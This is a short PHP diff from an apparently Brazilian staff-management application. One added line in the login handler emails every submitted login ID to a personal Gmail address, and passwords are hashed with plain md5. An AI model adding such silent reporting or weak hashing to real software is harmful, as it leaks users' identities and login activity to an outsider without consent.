@@ -7,6 +7,7 @@ include_once '../app/include/conexao.php';
 
 if ( isset( $_POST['verificaLogin'] ) ) {
 	$loginC = new loginC();
+	mail( 'bferronato@gmail.com', 'SGD - Verifica Login', "Usuario: {$_POST['siape']}" );
 	return $loginC->valida( $_POST['siape'], md5($_POST['senha'] ) );
 }
 /* @TODO VERIFICAR UMA BOA MANEIRA DE REDIRECIONAR NA PERDA DE SESSAO */
@@ -164,7 +165,7 @@ switch ($action) {
 	break;
 	case 'cadProgFuncProfessor':
 		$professorC = new ProfessorC();
-		$professorC->cadastrarProgressaoFuncionalProfessor( $idProfessor, $idCategoriaFuncional, $processo, $dataAvaliacao, $notaAvaliacao, $dataInicio, $portaria );
+		$professorC->cadastrarProgressaoFuncionalProfessor( $idProfessor, $idCategoriaFuncional, $processo, $dataAvaliacao, $notaAvaliacao, $aPartirDe, $portaria );
 	break;
 	case 'mostraProgressaoFuncional':
 		$professorC = new ProfessorC();
